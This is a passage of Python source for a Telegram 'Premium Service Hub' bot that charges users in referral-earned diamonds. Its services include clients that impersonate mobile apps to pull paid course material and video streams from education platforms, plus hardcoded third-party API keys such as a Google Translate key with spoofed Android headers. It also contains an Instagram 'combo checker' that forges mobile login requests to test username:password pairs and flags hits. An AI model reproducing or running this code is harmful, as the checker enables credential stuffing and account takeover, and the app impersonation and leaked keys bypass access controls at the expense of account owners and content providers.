            num = random.randint(10000000, 99999999)
            chars = string.ascii_letters + string.digits + "+/"
            self.auth_data["auth_token"] = f"{num}|{''.join(random.choices(chars, k=43))}"
        if not self.auth_data.get("client_id"):
            self.auth_data["client_id"] = "".join(
                random.choices("0123456789abcdef", k=16)
            )
        self._save_auth()

    def _load_auth(self) -> dict:
        if os.path.exists(self.auth_file):
            try:
                with open(self.auth_file, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                return {}
        return {}

    def _save_auth(self):
        try:
            with open(self.auth_file, "w", encoding="utf-8") as f:
                json.dump(self.auth_data, f, indent=2)
        except Exception:
            pass

    def _signature(self, ts: str) -> str:
        mac = hmac.new(self.secret_key, ts.encode("utf-8"), hashlib.sha256)
        return base64.b64encode(mac.digest()).decode("utf-8")

    def headers(self, include_x_auth=False) -> dict:
        ts = str(int(time.time()))
        h = {
            "Host": "api.asmultiverse.com",
            "madx-auth-signature": self._signature(ts),
            "cache-control": "no-cache",
            "madx-auth-key": base64.b64encode(ts.encode("utf-8")).decode("utf-8"),
            "x-client-id": self.auth_data.get("client_id", ""),
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
            "authorization": f"Bearer {self.auth_data.get('auth_token', '')}",
            "x-auth-key": (
                self.auth_data.get("x_auth_key", "") if include_x_auth else ""
            ),
        }
        return h

    def generate_fresh_auth_key(self) -> tuple:
        for _ in range(4):
            try:
                r = requests.get(
                    f"{self.base_url}/api/v1/kgs/generate",
                    headers=self.headers(),
                    timeout=20,
                )
                res = r.json()
                if res.get("status") == 200 and res.get("success"):
                    short_url = res["data"]["shortenedUrl"]
                    if "arolinks.com" in short_url:
                        key = extract_arolinks_code(short_url)
                        if key:
                            self.auth_data["x_auth_key"] = key
                            self.auth_data["auth_key_timestamp"] = (
                                datetime.now().isoformat()
                            )
                            self._save_auth()
                            return True, key, short_url
                    return False, None, short_url
            except Exception as e:
                logger.warning(f"KGS generate_fresh_auth_key error: {e}")
            time.sleep(1)
        return False, None, ""

    def search_batches(self, query: str) -> list:
        r = requests.get(
            f"{self.base_url}/api/v1/kgs/batches/search",
            params={"search": query},
            headers=self.headers(),
            timeout=25,
        )
        res = r.json()
        if res.get("status") == 200 and res.get("success"):
            return res.get("data", [])
        return []

    def get_subjects(self, batch_id: str) -> list:
        r = requests.get(
            f"{self.base_url}/api/v1/kgs/batches/{batch_id}/details",
            headers=self.headers(),
            timeout=25,
        )
        res = r.json()
        if res.get("status") == 200 and res.get("success"):
            return res.get("data", [])
        return []

    def get_subject_content(self, batch_id: str, subject_id: str) -> dict:
        if not self.auth_data.get("x_auth_key"):
            self.generate_fresh_auth_key()
        for _ in range(2):
            r = requests.get(
                f"{self.base_url}/api/v1/kgs/batches/{batch_id}/lessons/{subject_id}/details",
                headers=self.headers(include_x_auth=True),
                timeout=25,
            )
            res = r.json()
            if res.get("status") == 200 and res.get("success"):
                return res.get("data", {})
            msg = str(res.get("message", ""))
            if "Auth Key" in msg or "Expired" in msg or "Invalid" in msg:
                self.generate_fresh_auth_key()
                continue
            break
        return {}


KGS_CLIENT = KGSBotClient()


# ----------------------------------------------------------------------------
# 4️⃣ SERVICE 4 & 9: SIGMASTUDY CLIENT (from sigma_study_by_igris.py)
# ----------------------------------------------------------------------------

SIGMA_API_KEY = "795DF065FDBB"
SIGMA_BASE_URL = "https://h1.sigmastudy.site/api/v1"
SIGMA_HEADERS = {
    "User-Agent": "Dart/3.8 (dart:io)",
    "Content-Type": "application/json",
    "x-api-key": SIGMA_API_KEY,
    "Accept-Encoding": "gzip",
    "Host": "h1.sigmastudy.site",
}


def sigma_search_batches(keyword: str) -> list:
    params = {"keyword": keyword, "page": "1", "class": "12", "exam": "SSC"}
    resp = requests.get(
        f"{SIGMA_BASE_URL}/batch/searchadv",
        headers=SIGMA_HEADERS,
        params=params,
        timeout=25,
    )
    resp.raise_for_status()
    return resp.json().get("data", {}).get("batches", [])


def sigma_get_subjects(batch_id: str) -> list:
    resp = requests.get(
        f"{SIGMA_BASE_URL}/batch/{batch_id}/subject",
        headers=SIGMA_HEADERS,
        timeout=25,
    )
    resp.raise_for_status()
    return resp.json().get("data", [])


def sigma_get_chapters(batch_id: str, subject_id: str) -> list:
    resp = requests.get(
        f"{SIGMA_BASE_URL}/batch/{batch_id}/subject/{subject_id}/chapter",
        headers=SIGMA_HEADERS,
        timeout=25,
    )
    resp.raise_for_status()
    return resp.json().get("data", [])


def sigma_get_content(
    batch_id: str, subject_id: str, chapter_id: str, content_type: str
) -> list:
    resp = requests.get(
        f"{SIGMA_BASE_URL}/batch/{batch_id}/subject/{subject_id}/chapter/{chapter_id}/content",
        headers=SIGMA_HEADERS,
        params={"type": content_type},
        timeout=25,
    )
    resp.raise_for_status()
    return resp.json().get("data", [])


def sigma_get_video_url(
    batch_id: str, subject_id: str, chapter_id: str, content_id: str
) -> str:
    resp = requests.get(
        f"{SIGMA_BASE_URL}/batch/{batch_id}/subject/{subject_id}/chapter/{chapter_id}/content/{content_id}",
        headers=SIGMA_HEADERS,
        timeout=25,
    )
    resp.raise_for_status()
    return resp.json().get("data", {}).get("streamUrl", "")


# ----------------------------------------------------------------------------
# 5️⃣ SERVICE 5: GOOGLE CLOUD TRANSLATE API v2 (from translate_api.py)
# ----------------------------------------------------------------------------

TRANSLATE_URL = "https://translation.googleapis.com/language/translate/v2"
TRANSLATE_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.12.0",
    "x-android-package": "evolly.app.translatez",
    "x-android-cert": "ff0ebe4e6358778ec5989e9ff05d735122b8b212",
}
TRANSLATE_API_KEY = "AIzaSyC14KBn3lGyluVW4kY-o1If6ChNxrW_ggQ"

SUPPORTED_LANGS = {
    "en": "🇬🇧 English",
    "hi": "🇮🇳 Hindi",
    "es": "🇪🇸 Spanish",
    "fr": "🇫🇷 French",
    "ar": "🇸🇦 Arabic",
    "ru": "🇷🇺 Russian",
    "de": "🇩🇪 German",
    "ja": "🇯🇵 Japanese",
    "pt": "🇧🇷 Portuguese",
    "bn": "🇧🇩 Bengali",
    "ur": "🇵🇰 Urdu",
    "pa": "🇮🇳 Punjabi",
}


def google_translate_text(text: str, target_lang: str = "en") -> tuple:
    """Uses exact API key & Android headers from translate_api.py."""
    try:
        data = {
            "key": TRANSLATE_API_KEY,
            "q": text,
            "target": target_lang,
            "format": "text",
        }
        r = requests.post(
            TRANSLATE_URL, headers=TRANSLATE_HEADERS, data=data, timeout=20
        )
        res = r.json()
        if "data" in res and "translations" in res["data"]:
            t_obj = res["data"]["translations"][0]
            translated = t_obj.get("translatedText", "")
            detected = t_obj.get("detectedSourceLanguage", "auto")
            return True, translated, detected
        return False, r.text, "unknown"
    except Exception as e:
        return False, str(e), "error"


# ----------------------------------------------------------------------------
# 6️⃣ SERVICE 6: INSTAGRAM CHECKER v2.0 (from instagram_checker.py)
# ----------------------------------------------------------------------------

IG_SIG_KEY = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IG_VERSION = "269.0.0.18.75"
IG_APP_ID = "567067343352427"


def ig_check_single_combo(username: str, password: str) -> dict:
    """Exact Instagram mobile login signature check from instagram_checker.py."""
    device_id = f"android-{uuid.uuid4().hex[:16]}"
    guid = str(uuid.uuid4())
    phone_id = str(uuid.uuid4())
    timestamp = str(int(time.time()))

    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM:0:{timestamp}:{password}",
        "guid": guid,
        "phone_id": phone_id,
        "device_id": device_id,
        "_csrftoken": "missing",
        "login_attempt_count": "0",
        "country_codes": json.dumps([{"country_code": "1", "source": ["default"]}]),
        "jazoest": "22" + str(random.randint(100, 999)),
    }
    payload_json = json.dumps(payload, separators=(",", ":"))
    signed_body = f"SIGNATURE.{payload_json}"

    headers = {
        "X-IG-App-Locale": "en_US",
        "X-IG-Device-Locale": "en_US",
        "X-IG-Mapped-Locale": "en_US",
        "X-Pigeon-Session-Id": str(uuid.uuid4()),
        "X-Pigeon-Rawclienttime": timestamp,
        "X-IG-Connection-Speed": f"{random.randint(1000, 3000)}kbps",
        "X-IG-Bandwidth-Speed-KBPS": str(random.uniform(2000.0, 5000.0)),
        "X-IG-Bandwidth-TotalBytes-B": "0",
        "X-IG-Bandwidth-TotalTime-MS": "0",
        "X-IG-App-Startup-Country": "US",
        "X-Bloks-Version-Id": "b2e3c9c8e5b7d1a6f3d4e9c8b5a7d1e6f3c4b5a7",
        "X-IG-WWW-Claim": "0",
        "X-Bloks-Is-Layout-RTL": "false",
        "X-Bloks-Is-Panorama-Enabled": "true",
        "X-IG-Device-ID": guid,
        "X-IG-Family-Device-ID": phone_id,
        "X-IG-Android-ID": device_id,
        "X-IG-Timezone-Offset": "0",
        "X-IG-Connection-Type": "WIFI",
        "X-IG-Capabilities": "3brTvx8=",
        "X-IG-App-ID": IG_APP_ID,
        "Priority": "u=3",
        "User-Agent": (
            f"Instagram {IG_VERSION} Android (28/9.0; 480dpi; 1080x2137; "
            f"Xiaomi/xiaomi; Redmi Note 7; lavender; qcom; en_US; {IG_APP_ID})"
        ),
        "Accept-Language": "en-US",
        "X-MID": "Y"
        + "".join(
            random.choices(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
                k=22,
            )
        ),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Host": "i.instagram.com",
        "X-FB-HTTP-Engine": "Liger",
        "Connection": "close",
    }

    try:
        r = requests.post(
            "https://i.instagram.com/api/v1/accounts/login/",
            data=f"signed_body={signed_body}",
            headers=headers,
            timeout=20,
            allow_redirects=False,
        )
        res = r.json()
        status = res.get("status", "fail")
        if status == "fail":
            error_type = res.get("error_type", "unknown")
            message = res.get("message", "Login failed")
            if "checkpoint" in error_type or "challenge" in error_type:
                return {
                    "result": "HIT_CHECKPOINT",
                    "combo": f"{username}:{password}",
                    "detail": f"Checkpoint/2FA ({error_type})",
                }
            elif error_type == "bad_password" or "incorrect" in message.lower():
                return {
                    "result": "FAIL",
                    "combo": f"{username}:{password}",
                    "detail": "Wrong Password",
                }
            elif "rate_limit" in error_type or "spam" in message.lower():
                return {
                    "result": "ERROR",
                    "combo": f"{username}:{password}",
                    "detail": "Rate Limited",
                }
            return {
                "result": "FAIL",
                "combo": f"{username}:{password}",
                "detail": f"{error_type}: {message}",
            }

        if "logged_in_user" in res:
            u = res["logged_in_user"]
            return {
                "result": "HIT",
                "combo": f"{username}:{password}",
                "detail": (
                    f"Name: {u.get('full_name', 'N/A')} | "
                    f"Verified: {u.get('is_verified', False)} | "
                    f"Private: {u.get('is_private', False)}"
                ),
            }
        return {
            "result": "HIT",
            "combo": f"{username}:{password}",
            "detail": "Login Success",
        }
    except Exception as e:
        return {
            "result": "ERROR",
            "combo": f"{username}:{password}",
            "detail": str(e),
        }


# ----------------------------------------------------------------------------
# 7️⃣ SERVICE 7: TELEGRAM CHANNEL DOWNLOADER CONFIG & PARSER (from telegram_downloader.py)
# ----------------------------------------------------------------------------

def generate_telethon_config_bundle(
    channel_id: str,
    msg_range: str = "all",
    api_id: str = "YOUR_API_ID",
    api_hash: str = "YOUR_API_HASH",
    phone: str = "YOUR_PHONE_NUMBER",
) -> str:
    """Generates a ready-to-use config.json compatible with telegram_downloader.py."""
    cfg = {
        "global": {
            "api_id": api_id,
            "api_hash": api_hash,
            "phone_number": phone,
            "session_name": "telegram_downloader",
            "download_base_path": "./downloads",
            "max_concurrent_downloads": 3,
            "retry_attempts": 3,
            "retry_delay_seconds": 5,
            "enable_logging": True,
            "log_file": "downloader.log",
            "log_level": "INFO",
            "create_channel_folders": True,
            "save_metadata": True,
        },
        "channels": [
            {
                "channel_id": channel_id,
                "enabled": True,
                "message_ranges": [msg_range],
                "file_types": [".pdf", ".zip", ".mp4", ".jpg", ".png", ".mkv"],
                "max_file_size_mb": 4096,
                "skip_existing": True,
                "download_photos": True,
                "download_documents": True,
                "download_videos": True,
                "custom_folder_name": None,
            }
        ],
    }
    return json.dumps(cfg, indent=2, ensure_ascii=False)


# ============================================================================
# 🤖 TELEGRAM BOT API ENGINE (ZERO EXTERNAL BOT FRAMEWORK DEPENDENCY)
# ============================================================================

class TelegramBotClient:
    """
    Lightweight, rock-solid Telegram Bot API client using `requests`.
    """

    def __init__(self, token: str):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.file_url = f"https://api.telegram.org/file/bot{token}"
        self.session = requests.Session()
        self.bot_username = ""
        self.bot_name = "Premium Service Bot"

    def api_call(self, method: str, payload: dict = None, files: dict = None, timeout: int = 35) -> dict:
        url = f"{self.base_url}/{method}"
        try:
            if files:
                r = self.session.post(url, data=payload or {}, files=files, timeout=timeout)
            else:
                r = self.session.post(url, json=payload or {}, timeout=timeout)
            return r.json()
        except Exception as e:
            logger.error(f"Telegram API error [{method}]: {e}")
            return {"ok": False, "description": str(e)}

    def get_me(self) -> dict:
        res = self.api_call("getMe")
        if res.get("ok"):
            data = res["result"]
            self.bot_username = data.get("username", "")
            self.bot_name = data.get("first_name", "Premium Service Bot")
            return data
        return {}

    def send_message(
        self,
        chat_id: int,
        text: str,
        reply_markup: dict = None,
        parse_mode: str = "HTML",
        disable_web_page_preview: bool = True,
    ) -> dict:
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview,
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        return self.api_call("sendMessage", payload)

    def edit_message(
        self,
        chat_id: int,
        message_id: int,
        text: str,
        reply_markup: dict = None,
        parse_mode: str = "HTML",
    ) -> dict:
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        return self.api_call("editMessageText", payload)

    def answer_callback(self, callback_id: str, text: str = "", show_alert: bool = False):
        return self.api_call(
            "answerCallbackQuery",
            {
                "callback_query_id": callback_id,
                "text": text[:195] if text else "",
                "show_alert": show_alert,
            },
        )

    def send_document_bytes(
        self,
        chat_id: int,
        file_bytes: bytes,
        filename: str,
        caption: str = "",
        reply_markup: dict = None,
    ) -> dict:
        payload = {"chat_id": str(chat_id), "caption": caption, "parse_mode": "HTML"}
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        files = {"document": (filename, io.BytesIO(file_bytes))}
        return self.api_call("sendDocument", payload=payload, files=files, timeout=90)

    def send_document_path(
        self,
        chat_id: int,
        file_path: str,
        caption: str = "",
        reply_markup: dict = None,
    ) -> dict:
        payload = {"chat_id": str(chat_id), "caption": caption, "parse_mode": "HTML"}
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        with open(file_path, "rb") as f:
            files = {"document": (os.path.basename(file_path), f)}
            return self.api_call("sendDocument", payload=payload, files=files, timeout=120)

    def download_file_bytes(self, file_id: str) -> tuple:
        res = self.api_call("getFile", {"file_id": file_id})
        if not res.get("ok"):
            return None, res.get("description", "Failed to get file info")
        file_path = res["result"].get("file_path")
        r = self.session.get(f"{self.file_url}/{file_path}", timeout=60)
        if r.status_code == 200:
            return r.content, os.path.basename(file_path)
        return None, f"HTTP {r.status_code}"


# ============================================================================
# 🧭 USER SESSION STATE TRACKING
# ============================================================================

USER_STATES = {}  # user_id -> {"mode": str, "data": dict}
STATE_LOCK = threading.Lock()


def set_state(user_id: int, mode: str, data: dict = None):
    with STATE_LOCK:
        USER_STATES[user_id] = {"mode": mode, "data": data or {}}


def get_state(user_id: int) -> dict:
    with STATE_LOCK:
        return USER_STATES.get(user_id, {"mode": None, "data": {}})


def clear_state(user_id: int):
    with STATE_LOCK:
        USER_STATES.pop(user_id, None)


# ============================================================================
# 🎨 KEYBOARD & DASHBOARD BUILDERS
# ============================================================================

def build_main_menu_keyboard(user_id: int) -> dict:
    services = get_all_services(include_disabled=False)
    rows = []
    current_row = []

    for svc in services:
        btn_text = f"{svc['icon']} {svc['slot']}. {sbold(svc['name'])}"
        current_row.append(
            {"text": btn_text, "callback_data": f"open_svc:{svc['code']}"}
        )
        if len(current_row) == 2:
            rows.append(current_row)
            current_row = []
    if current_row:
        rows.append(current_row)

    rows.append(
        [
            {"text": "💎 𝗠𝘆 𝗪𝗮𝗹𝗹𝗲𝘁", "callback_data": "menu:wallet"},
            {"text": "🎁 𝗥𝗲𝗳𝗲𝗿 & 𝗘𝗮𝗿𝗻 (𝟭𝟬💎/𝗗𝗮𝘆)", "callback_data": "menu:refer"},
        ]
    )
    rows.append(
        [
            {"text": "📜 𝗔𝗹𝗹 𝟭𝟬 𝗦𝗲𝗿𝘃𝗶𝗰𝗲𝘀 𝗚𝘂𝗶𝗱𝗲", "callback_data": "menu:guide"},
            {"text": "🏆 𝗟𝗲𝗮𝗱𝗲𝗿𝗯𝗼𝗮𝗿𝗱", "callback_data": "menu:leaderboard"},
        ]
    )

    if is_user_admin(user_id):
        rows.append(
            [
                {
                    "text": "👑 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗣𝗔𝗡𝗘𝗟 (/admin)",
                    "callback_data": "admin:home",
                }
            ]
        )

    return {"inline_keyboard": rows}


def build_back_home_kb(extra_buttons: list = None) -> dict:
    rows = []
    if extra_buttons:
        rows.extend(extra_buttons)
    rows.append(
        [
            {"text": "🏠 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂", "callback_data": "menu:home"},
            {"text": "🎁 𝗘𝗮𝗿𝗻 𝗗𝗶𝗮𝗺𝗼𝗻𝗱𝘀", "callback_data": "menu:refer"},
        ]
    )
    return {"inline_keyboard": rows}


def render_home_dashboard(bot: TelegramBotClient, user: dict, is_new: bool = False) -> str:
    uid = user["user_id"]
    first_name = html_escape(user.get("first_name") or "VIP Member")
    diamonds = user.get("diamonds", 0)
    total_refs = user.get("total_referrals", 0)
    used_count = user.get("total_services_used", 0)
    earned_today, max_daily = get_user_daily_ref_progress(uid)
    signup_bonus = get_setting("signup_bonus", "5")
    svc_cost = get_setting("default_service_cost", "1")
    ref_reward = get_setting("referral_reward", "1")

    ref_link = (
        f"https://t.me/{bot.bot_username}?start=ref_{uid}"
        if bot.bot_username
        else f"https://t.me/YourBot?start=ref_{uid}"
    )

    bonus_banner = ""
    if is_new:
        bonus_banner = (
            f"🎊 <b>𝗖𝗢𝗡𝗚𝗥𝗔𝗧𝗨𝗟𝗔𝗧𝗜𝗢𝗡𝗦! 𝗦𝗜𝗚𝗡-𝗨𝗣 𝗕𝗢𝗡𝗨𝗦 𝗖𝗥𝗘𝗗𝗜𝗧𝗘𝗗!</b> 🎊\n"
            f"🎁 You received <b>+{signup_bonus} 💎 Diamonds</b> as your welcome gift!\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        )

    services = get_all_services(include_disabled=False)
    svc_lines = []
    for s in services:
        svc_lines.append(
            f"  <b>{s['slot']:02d}.</b> {s['icon']} <b>{html_escape(s['name'])}</b> — <code>{s['cost']} 💎</code>"
        )
    services_preview = "\n".join(svc_lines)

    return (
        f"╭━━━✦❘༻ 💎 <b>𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗛𝗨𝗕</b> 💎 ༺❘✦━━━╮\n\n"
        f"{bonus_banner}"
        f"👋 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {first_name}!</b>\n"
        f"🆔 <b>𝗨𝘀𝗲𝗿 𝗜𝗗:</b> <code>{uid}</code>\n"
        f"💎 <b>𝗗𝗶𝗮𝗺𝗼𝗻𝗱 𝗕𝗮𝗹𝗮𝗻𝗰𝗲:</b> <b>{diamonds} 💎</b> "
        f"{'<i>(👑 Admin Unlimited)</i>' if is_user_admin(uid) else ''}\n"
        f"👥 <b>𝗧𝗼𝘁𝗮𝗹 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹𝘀:</b> <b>{total_refs}</b>  |  "
        f"📅 <b>𝗧𝗼𝗱𝗮𝘆'𝘀 𝗥𝗲𝗳 𝗘𝗮𝗿𝗻𝗶𝗻𝗴𝘀:</b> <b>{earned_today}/{max_daily} 💎</b>\n"
        f"⚡ <b>𝗦𝗲𝗿𝘃𝗶𝗰𝗲𝘀 𝗨𝘀𝗲𝗱:</b> <b>{used_count}</b>\n\n"
        f"┏━━━ 💠 <b>𝗗𝗜𝗔𝗠𝗢𝗡𝗗 𝗘𝗖𝗢𝗡𝗢𝗠𝗬 𝗥𝗨𝗟𝗘𝗦</b> 💠 ━━━┓\n"
        f"┃ 🎁 <b>𝗦𝗶𝗴𝗻-𝗨𝗽 𝗕𝗼𝗻𝘂𝘀:</b> <code>+{signup_bonus} 💎 Free</code>\n"
        f"┃ ⚡ <b>𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗖𝗼𝘀𝘁:</b> <code>{svc_cost} 💎 per use</code>\n"
        f"┃ 🤝 <b>𝗥𝗲𝗳𝗲𝗿 𝟭 𝗙𝗿𝗶𝗲𝗻𝗱:</b> <code>+{ref_reward} 💎 Instant</code>\n"
        f"┃ 🔥 <b>𝗗𝗮𝗶𝗹𝘆 𝗥𝗲𝗳𝗲𝗿 𝗟𝗶𝗺𝗶𝘁:</b> <code>Max {max_daily} 💎 / Day</code>\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"🚀 <b>𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦 ({len(services)}):</b>\n"
        f"{services_preview}\n\n"
        f"🔗 <b>𝗬𝗼𝘂𝗿 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹 𝗟𝗶𝗻𝗸:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"👇 <b>Select a service below to begin:</b>"
    )


# ============================================================================
# 👑 ADMIN PANEL (/admin) BUILDERS & HANDLERS
# ============================================================================

def build_admin_home_kb() -> dict:
    return {
        "inline_keyboard": [
            [
                {"text": "➕ 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗦𝗲𝗿𝘃𝗶𝗰𝗲", "callback_data": "admin:add_svc"},
                {"text": "🛠️ 𝗠𝗮𝗻𝗮𝗴𝗲 𝗦𝗲𝗿𝘃𝗶𝗰𝗲𝘀", "callback_data": "admin:list_svc"},
            ],
            [
                {"text": "💎 Add / Edit User Diamonds", "callback_data": "admin:diamonds"},
                {"text": "🎁 Gift Diamonds to All", "callback_data": "admin:gift_all"},
            ],
            [
                {"text": "⚙️ Economy & Bonus Rules", "callback_data": "admin:economy"},
                {"text": "👤 User Lookup / Ban", "callback_data": "admin:user_mgr"},
            ],
            [
                {"text": "📢 Broadcast to All Users", "callback_data": "admin:broadcast"},
                {"text": "📊 Live Stats & Export DB", "callback_data": "admin:stats"},
            ],
            [
                {"text": "🏠 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗨𝘀𝗲𝗿 𝗠𝗲𝗻𝘂", "callback_data": "menu:home"},
            ],
        ]
    }


def render_admin_dashboard() -> str:
    with DB_LOCK:
        conn = get_db()
        total_users = conn.execute("SELECT COUNT(*) AS c FROM users").fetchone()["c"]
        total_diamonds = (
            conn.execute("SELECT COALESCE(SUM(diamonds), 0) AS s FROM users").fetchone()[
                "s"
            ]
        )
        total_refs = (
            conn.execute(
                "SELECT COALESCE(SUM(total_referrals), 0) AS r FROM users"
            ).fetchone()["r"]
        )
        total_uses = (
            conn.execute(
                "SELECT COALESCE(SUM(total_services_used), 0) AS u FROM users"
            ).fetchone()["u"]
        )
        total_svcs = conn.execute("SELECT COUNT(*) AS c FROM services").fetchone()["c"]
        enabled_svcs = conn.execute(
            "SELECT COUNT(*) AS c FROM services WHERE enabled = 1"
        ).fetchone()["c"]
        conn.close()

    signup_bonus = get_setting("signup_bonus", "5")
    svc_cost = get_setting("default_service_cost", "1")
    ref_reward = get_setting("referral_reward", "1")
    max_daily = get_setting("max_daily_referral_diamonds", "10")

    return (
        f"👑 <b>𝗦𝗨𝗣𝗘𝗥 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗖𝗘𝗡𝗧𝗘𝗥 (/admin)</b> 👑\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>Total Registered Users:</b> <code>{total_users}</code>\n"
        f"💎 <b>Total Diamonds in Wallets:</b> <code>{total_diamonds} 💎</code>\n"
        f"🤝 <b>Total Referrals Completed:</b> <code>{total_refs}</code>\n"
        f"⚡ <b>Total Service Executions:</b> <code>{total_uses}</code>\n"
        f"🛠️ <b>Active Services:</b> <code>{enabled_svcs} / {total_svcs}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ <b>Current Economy Config:</b>\n"
        f" • Sign-Up Bonus: <b>{signup_bonus} 💎</b>\n"
        f" • Default Service Cost: <b>{svc_cost} 💎</b>\n"
        f" • Referral Reward: <b>+{ref_reward} 💎 / friend</b>\n"
        f" • Max Daily Referral Cap: <b>{max_daily} 💎 / day</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👇 <b>Choose an administrative action below:</b>"
    )


# ============================================================================
# 🚀 INTERACTIVE SERVICE EXECUTION FLOWS
# ============================================================================

def handle_service_open(bot: TelegramBotClient, chat_id: int, message_id: int, user_id: int, svc_code: str):
    svc = get_service(svc_code)
    if not svc or (svc["enabled"] == 0 and not is_user_admin(user_id)):
        bot.send_message(
            chat_id,
            "❌ <b>This service is currently unavailable or under maintenance.</b>",
            reply_markup=build_back_home_kb(),
        )
        return

    user = get_user(user_id)
    cost = int(svc.get("cost", 1))
    diamonds = user.get("diamonds", 0) if user else 0

    if not is_user_admin(user_id) and diamonds < cost:
        ref_link = f"https://t.me/{bot.bot_username}?start=ref_{user_id}"
        earned_today, max_daily = get_user_daily_ref_progress(user_id)
        text = (
            f"⚠️ <b>𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗗𝗜𝗔𝗠𝗢𝗡𝗗𝗦!</b> ⚠️\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔒 <b>Service:</b> {html_escape(svc['title_fancy'])}\n"
            f"💎 <b>Required:</b> <code>{cost} 💎</code>\n"
            f"👛 <b>Your Balance:</b> <code>{diamonds} 💎</code>\n\n"
            f"🎁 <b>𝗛𝗢𝗪 𝗧𝗢 𝗘𝗔𝗥𝗡 𝗙𝗥𝗘𝗘 𝗗𝗜𝗔𝗠𝗢𝗡𝗗𝗦:</b>\n"
            f"Refer your friends using your personal invite link below!\n"
            f"• <b>1 Friend = +1 💎 Diamond</b>\n"
            f"• <b>Maximum = {max_daily} 💎 Diamonds per day</b> (Today: {earned_today}/{max_daily} 💎)\n\n"
            f"🔗 <b>Your Invite Link:</b>\n"
            f"<code>{ref_link}</code>"
        )
        bot.edit_message(
            chat_id,
            message_id,
            text,
            reply_markup=build_back_home_kb(),
        )
        return

    prompts = {
        "svc_1": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>img_resizer.py</code> (4-Strategy Bulletproof Resizer)\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code> (Charged when image is processed)\n\n"
            f"📤 <b>How to use:</b>\n"
            f"Send any <b>Photo</b> or <b>Image Document</b> (.jpg, .png, .webp) right now in chat!\n"
            f"The bot will automatically compress & resize it to <b>99.0KB – 99.9KB JPEG</b> and send back the file."
        ),
        "svc_2": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>pw_link_to_video_downloader.py</code> (8-Thread 1MB Chunk Downloader + FFmpeg)\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"📤 <b>How to use:</b>\n"
            f"Send the <b>PW Video Base URL</b> (starting with <code>http://</code> or <code>https://</code>) now:"
        ),
        "svc_3": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>kgs_by_igris.py</code> (KGS API + Auto Arolinks Auth-Key)\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"🔍 <b>How to use:</b>\n"
            f"Reply with a <b>KGS Course / Batch keyword</b> to search (e.g. <code>chsl</code>, <code>ssc</code>, <code>upsc</code>, <code>foundation</code>):"
        ),
        "svc_4": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>sigma_study_by_igris.py</code> (SigmaStudy API v1)\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n\n"
            f"🔍 <b>How to use:</b>\n"
            f"Reply with a <b>SigmaStudy Batch keyword</b> to search (e.g. <code>ssc</code>, <code>maths</code>, <code>english</code>, <code>12</code>):"
        ),
        "svc_5": (
            f"{svc['title_fancy']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Engine:</b> <code>translate_api.py</code> (Google Cloud Translate v2)\n"
